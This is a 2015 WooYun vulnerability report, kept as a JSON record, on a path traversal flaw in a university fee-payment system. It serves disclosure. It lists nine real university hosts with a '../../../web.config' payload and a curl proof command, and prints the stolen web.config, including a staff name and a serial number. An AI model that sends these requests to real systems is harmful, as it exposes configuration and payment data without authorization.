{"id": 45006, "wybug_id": "wooyun-2015-089898", "wybug_title": "天津神州浩天高校网上银行收费系统任意文件下载漏洞", "wybug_corp": "天津神州浩天科技有限公司", "wybug_author": "Tea", "wybug_date": "2015-01-04 14:57", "wybug_open_date": "2015-04-04 14:58", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向公众公开  简要描述： 网络上用这个的还是有不少。 详细说明：  \nhttp://sfpt.tjufe.edu.cn/admin/down.aspx?type=notice&mc=../../../web.confighttp://202.201.166.131/wsyh/admin/down.aspx?type=notice&mc=../../../web.confighttp://218.199.196.90/admin/down.aspx?type=notice&mc=../../../web.confighttp://fin.hrbnu.edu.cn/wysf/admin/down.aspx?type=notice&mc=../../../web.confighttp://218.104.195.23/wsyh/admin/down.aspx?type=notice&mc=../../../web.confighttp://jf.cqwu.net/admin/down.aspx?type=notice&mc=../../../web.confighttp://202.38.194.47/admin/down.aspx?type=notice&mc=../../../web.confighttp://wsyh.tstc.edu.cn/admin/down.aspx?type=notice&mc=../../../web.confighttp://218.199.48.15/wsyh/admin/down.aspx?type=notice&mc=../../../web.config\nPOC：/admin/down.aspx?type=notice&mc=../../../web.config   漏洞证明：  \ncurl 'http://jf.cqwu.net/admin/down.aspx?type=notice&mc=../../../web.config'<?xml version=\"1.0\"?><!--     注意: 除了手动编辑此文件以外，您还可以使用     Web 管理工具来配置应用程序的设置。可以使用 Visual Studio 中的     “网站”->“Asp.Net 配置”选项。    设置和注释的完整列表在     machine.config.comments 中，该文件通常位于     \\Windows\\Microsoft.Net\\Framework\\v2.x\\Config 中--><configuration>\t<configSections>\t\t<section name=\"log4net\" type=\"System.Configuration.IgnoreSectionHandler\"/>\t</configSections>\t<appSettings>\t\t\t\t<!--\t#=======================================================================\t#银联在线支付参数配置\t#=======================================================================\t\t-->\t\t<add key=\"Charges_yl\" value=\"0\"/>\t\t<!--#银联支付手续费-->\t\t<add key=\"yinlianzfjghc\" value=\"http://jf.cqwu.net/Modules/jycg/yinlian/PayQuery.aspx\"/>\t\t<!--#银联支付结果回传地址-->\t\t<add key=\"wy_zdr_yl\" value=\"王家军\"/>\t\t<!--#银联支付制单人-->    <add key=\"wy_jffs_yl\" value=\"10\"/>    <!--银联缴费方式-->    <add key=\"is_rizhi\" value=\"1\"/>    <!--系统日志-->\t\t<!--\t#=======================================================================\t#银联在线支付参数配置\t#=======================================================================\t\t-->\t\t<add key=\"BasicClass.CommonClass\" value=\"http://localhost:8081/CommonClass.asmx\"/>\t\t<!--WebService 地址-->\t\t<add key=\"xlh\" value=\"B6DD68AA480D7EBD\"/>\t\t<!--网银程序序列号-->    \t\t<add key=\"is_rizhi\" value=\"1\"/>    \t\t<add key=\"isOrderError\" value=\"1\"/>\t<add key=\"ips.IpsOrderQuery.IpsCheckTrade\" value=\"http://webservice.ips.net.cn/Sinopay/Standard/IpsCheckTrade.asmx\"/>\t</appSettings>\t<connectionStrings/>\t<system.web>\t\t<!--             设置 compilation debug=\"true\" 将调试符号插入            已编译的页面中。但由于这会             影响性能，因此只在开发过程中将此值             设置为 true。        -->\t\t<httpHandlers>\t\t\t\t\t\t<add verb=\"POST,GET\" path=\"*.ashx\" type=\"AjaxPro.AjaxHandlerFactory, AjaxPro\"/>\t\t</httpHandlers>\t\t<compilation debug=\"false\" targetFramework=\"4.0\">\t\t\t<assemblies>\t\t\t\t\t\t\t\t<add assembly=\"System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/>\t\t\t\t<add assembly=\"System.Management, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/>\t\t\t\t<add assembly=\"System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089\"/>\t\t\t\t<add assembly=\"System.ServiceProcess, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/>\t\t\t\t<add assembly=\"System.Security, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/>\t\t\t\t<add assembly=\"System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/>\t\t\t\t<add assembly=\"System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089\"/>\t\t\t\t<add assembly=\"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089\"/>\t\t\t\t<add assembly=\"System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/>\t\t\t\t<add assembly=\"System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/>\t\t\t\t<add assembly=\"System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089\"/>\t\t\t\t<add assembly=\"System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/>\t\t\t\t<!--<add assembly=\"Microsoft.ReportViewer.WebForms, Version=10.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/>-->\t\t\t</assemblies>\t\t\t\t\t</compilation>\t\t<!--            通过 <authentication> 节可以配置 ASP.NET 使用的             安全身份验证模式，            以标识传入的用户。         -->\t\t<!-- <authentication mode=\"Windows\" />               如果在执行请求的过程中出现未处理的错误，            则通过 <customErrors> 节可以配置相应的处理步骤。具体说来，            开发人员通过该节可以配置            要显示的 html 错误页            以代替错误堆栈跟踪。        <customErrors mode=\"RemoteOnly\" defaultRedirect=\"GenericErrorPage.htm\">            <error statusCode=\"403\" redirect=\"NoAccess.htm\" />            <error statusCode=\"404\" redirect=\"FileNotFound.htm\" />        </customErrors>        -->\t\t<customErrors mode=\"RemoteOnly\" defaultRedirect=\"sysError.htm\">\t\t</customErrors>\t\t<httpRuntime maxRequestLength=\"812000\" useFullyQualifiedRedirectUrl=\"true\" executionTimeout=\"45\" requestValidationMode=\"2.0\"/>\t\t<sessionState mode=\"InProc\" stateConnectionString=\"tcpip=127.0.0.1:42424\" sqlConnectionString=\"data source=127.0.0.1;Trusted_Connection=yes\" cookieless=\"false\" timeout=\"20000\"/>\t\t<globalization responseEncoding=\"gb2312\" requestEncoding=\"gb2312\"/>\t\t<pages controlRenderingCompatibilityVersion=\"3.5\" clientIDMode=\"AutoID\"/>\t</system.web>\t<system.webServer>\t\t<handlers>\t\t\t<add name=\"ReportViewerWebControlHandler\" preCondition=\"integratedMode\" verb=\"*\" path=\"Reserved.ReportViewerWebControl.axd\" type=\"Microsoft.Reporting.WebForms.HttpHandler, Microsoft.ReportViewer.WebForms, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"/>\t\t</handlers>\t\t<validation validateIntegratedModeConfiguration=\"false\"/>  <defaultDocument>    <files>      <add value=\"login.aspx\"/>    </files>  </defaultDocument>\t</system.webServer></configuration>\n   修复方案：  过滤特殊符合现在下载文件名，以及限制跨目录   版权声明：转载请注明来源 Tea@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-09 11:10 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向赛尔教育、厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-04 14:59 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这公司是我开的？    \n     2015-01-04 14:59 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  昨天刚从天津回来    \n     2015-01-04 15:17 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @浩天天津没啥玩的a     \n     2015-01-04 15:24 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @HackBraid 确实没啥玩的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}